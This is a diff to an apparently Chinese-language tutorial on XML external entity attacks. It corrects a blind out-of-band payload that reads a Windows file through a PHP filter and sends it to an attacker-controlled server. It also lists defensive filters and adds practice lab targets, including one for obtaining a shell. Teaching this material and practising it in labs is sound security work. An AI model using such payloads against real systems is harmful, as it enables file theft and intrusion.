@@ -63,7 +63,7 @@ python -m http.server 80
 ```xml
 test.dtd
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/windows/win.ini"><!--读取文件存放到file中-->
-<!ENTITY % payload "<!ENTITY % send SYSTEM 'http://192.168.43.117:8080/?abc=%file;'>"> %payload;<!--将文件作为参数发送请求到我们自己的vps中，最终的数据会存放到我们的访问日志中-->
+<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://192.168.43.117:8080/?abc=%file;'>"> %payload;<!--将文件作为参数发送请求到我们自己的vps中，最终的数据会存放到我们的访问日志中-->
 
 payload
 <?xml version= "1.0"?>
@@ -129,3 +129,17 @@ libxml_disable_entity_loader(true);
 ```
 #### 2、过滤
 过滤<!DOCTYPE>, <!ENTITY>, SYSTEM，file://,http:// 等
+### 七、练习
+```
+练习：
+1. 无回显利用，pikachu
+http://172.168.20.210:84/vul/xxe/xxe_1.php  
+2. xxe探测：
+黑盒：
+    http://172.168.20.210:85/
+    http://web.jarvisoj.com:9882/
+白盒：
+    http://172.168.20.210:8130/
+拿shell:
+    http://172.168.20.250/(xxe+Struts2漏洞)
+```
